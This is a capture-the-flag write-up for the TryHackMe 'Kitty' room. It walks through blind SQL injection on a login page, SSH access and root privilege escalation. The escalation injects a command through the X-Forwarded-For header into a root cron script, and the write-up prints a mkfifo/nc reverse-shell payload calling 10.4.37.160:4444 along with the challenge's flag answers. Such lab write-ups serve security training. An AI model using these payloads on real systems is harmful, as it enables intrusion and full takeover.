# Kitty

## Task 1  What is the user and root flag?
+ What is the user flag? `THM{3xex0x9x8x7xcxcxbxax6xbxbx6xbx6x}`
+ What is the root flag? `THM{5x1xfx2xbx3x2x1x7x0x6x3xexfx3xbx}`
## Task 2  Thank you
+ Thank you for playing. `No Answer Needed`

### Enumeration
+ Try to signup with user `kitty` and we got error `This username is already taken.`
+ Register new user 
+ Try SQLinjection on Login 
    - Query Using `' OR 1=1 -- -'` Return Error and logged something weird on logged and validation
    - Query Using `newuser' AND SELECT 'a' = 'a' -- -` Passed 
+ Create a python to brute the Database, Table and Password for `Kitty`

+ After Get Creadential 
```bash
hengkisirait: Kitty $ ssh kitty@10.10.131.226
kitty@kitty:~$ ls
user.txt
kitty@kitty:~$ cat user.txt
THM{3xex0x9x8x7xcxcxbxax6xbxbx6xbx6x}
kitty@kitty:~$
```

### Privelege Escalation
+ Upload linpeas and have an active port `8080`
+ found weird file on `/opt` and after look using pspy64 it's running every minutes
```bash
kitty@kitty:~$ cat /opt/log_checker.sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged"; 
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

+ Using `linpeas.sh` we got the file `VHOST 127.0.0.1:8080` and server linten on localhost 8080 check vhost file to abuse
+ Check on `index.php` on development site `/var/www/development`
```php
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: welcome.php");
    exit;
}

include('config.php');
$username = $_POST['username'];
$password = $_POST['password'];
// SQLMap
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
	if (preg_match( $evilword, $username )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];   // THIS IS THE PAYLOAD TO INJECT
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip); // THE PAYLOAD WILL WRITE TO THIS FILE
		die();
	} elseif (preg_match( $evilword, $password )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);
		die();
	}
}


$sql = "select * from siteusers where username = '$username' and password = '$password';";
$result = mysqli_query($mysqli, $sql);
$row = mysqli_fetch_array($result, MYSQLI_ASSOC);
$count = mysqli_num_rows($result);
if($count == 1){
	// Password is correct, so start a new session
	session_start();

	// Store data in session variables
	$_SESSION["loggedin"] = true;
	$_SESSION["username"] = $username;
	// Redirect user to welcome page
	header("location: welcome.php");
} elseif ($username == ""){
	$login_err = "";
} else{
	// Password is not valid, display a generic error message
	$login_err = "Invalid username or password";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Development User Login</h2>
        <p>Please fill in your credentials to login.</p>

<?php
if(!empty($login_err)){
        echo '<div class="alert alert-danger">' . $login_err . '</div>';
}
?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
	    </div>
	    <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

+ So we need to TUNNELING the local PORT (8080) `ssh -L 8080:127.0.0.1:8080 kitty@10.10.131.226`
+ Generate python script to get call on localhost (proxy) 
```bash
kitty@kitty:/var/www/development$ tail -f logged
$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.37.160 4444 >/tmp/f)
```

+ Generate new python request exploit the `X-Forwaded-For: payload`
```bash
hengkisirait: ~ $ nc -l 4444
id
bash: cannot set terminal process group (4244): Inappropriate ioctl for device
bash: no job control in this shell
root@kitty:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kitty:~# cd /root
cd /root/
root@kitty:~# ls
ls
logged
root.txt
snap
root@kitty:~# cat root.txt
cat root.txt
THM{5x1xfx2xbx3x2x1x7x0x6x3xexfx3xbx}
```